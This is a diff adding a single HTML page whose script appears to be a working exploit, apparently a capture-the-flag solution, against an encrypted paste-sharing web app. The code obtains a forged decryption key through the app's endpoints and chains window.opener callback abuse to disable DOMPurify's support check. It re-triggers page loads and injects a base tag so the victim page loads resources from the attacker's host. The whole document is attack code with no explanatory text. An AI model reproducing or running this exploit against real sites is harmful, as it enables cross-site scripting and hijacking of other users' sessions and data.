@@ -1,0 +1,100 @@
+<script>
+	function arrayBufferToBase64(buffer) {
+		var binary = ''
+		var bytes = new Uint8Array(buffer)
+		var len = bytes.byteLength
+		for (var i = 0; i < len; i++) {
+			binary += String.fromCharCode(bytes[i])
+		}
+		return window.btoa(binary)
+	}
+	function base64ToArrayBuffer(base64) {
+		var binary_string = window.atob(base64)
+		var len = binary_string.length
+		var bytes = new Uint8Array(len)
+		for (var i = 0; i < len; i++) {
+			bytes[i] = binary_string.charCodeAt(i)
+		}
+		return bytes.buffer
+	}
+	function serialize(obj) {
+		return JSON.stringify(obj, (key, value) => {
+			if (value?.buffer instanceof ArrayBuffer) {
+				return {
+					type: value.constructor.name,
+					data: arrayBufferToBase64(value.buffer)
+				}
+			}
+			return value
+		})
+	}
+	function deserialize(obj) {
+		return JSON.parse(obj, (key, value) => {
+			if (value?.type in globalThis && value?.data) {
+				return new globalThis[value.type](base64ToArrayBuffer(value.data))
+			}
+			return value
+		})
+	}
+	;(async () => {
+		const outbase = `${location.protocol}//${location.host}`
+		const from = new URL(new URLSearchParams(location.search).get('from'))
+		const base = `${from.protocol}//${from.host}`
+		const targetId = from.searchParams.get('id')
+		const result = await fetch('/proxy', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json'
+			},
+			body: JSON.stringify({
+				url: base + `/api/pastes/${targetId}`
+			})
+		})
+			.then(r => r.text())
+			.then(deserialize)
+		console.log(result)
+		const xss = `<base href=${JSON.stringify(outbase)}>`
+		const jwkkey = await fetch('/get_key', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json'
+			},
+			body: JSON.stringify({
+				random_ct: arrayBufferToBase64(result.content),
+				target_msg: btoa(JSON.stringify({ title: 'abc', content: xss }))
+			})
+		}).then(r => r.json())
+		console.log(jwkkey)
+		const priv = await crypto.subtle.importKey('jwk', jwkkey, { name: 'RSA-OAEP', hash: 'SHA-256' }, true, [
+			'decrypt'
+		])
+		const pt = await crypto.subtle.decrypt({ name: 'RSA-OAEP', hash: 'SHA-256' }, priv, result.content)
+		console.log(new TextDecoder().decode(pt))
+		const ctx = {
+			key: {
+				type: 'jwk',
+				data: jwkkey
+			},
+			hash: 'SHA-256'
+		}
+		const deleteIsSupported =
+			base +
+			`/paste?id=${encodeURIComponent(targetId + '?callback=delete[window.opener.DOMPurify][0].isSupported#')}`
+		const retriggerLoad = base + `/paste?id=${encodeURIComponent(targetId + '?callback=window.opener.load#')}`
+		const retriggerOnload = base + `/paste?id=${encodeURIComponent(targetId + '?callback=window.opener.onload#')}`
+		const victim = base + `/paste?id=${encodeURIComponent(targetId)}#${btoa(serialize(ctx))}`
+		const w = open('/x', 'RSA-OAEP')
+		await new Promise(r => setTimeout(r, 1000))
+		const w2 = w.open('/y')
+		w.location = victim
+		await new Promise(r => setTimeout(r, 1000))
+		w2.location = deleteIsSupported
+		await new Promise(r => setTimeout(r, 1000))
+		w2.location = retriggerLoad
+		// now, base uri points to attacker's host
+		await new Promise(r => setTimeout(r, 1000))
+		w2.location = retriggerOnload
+
+		history.back()
+	})()
+</script>
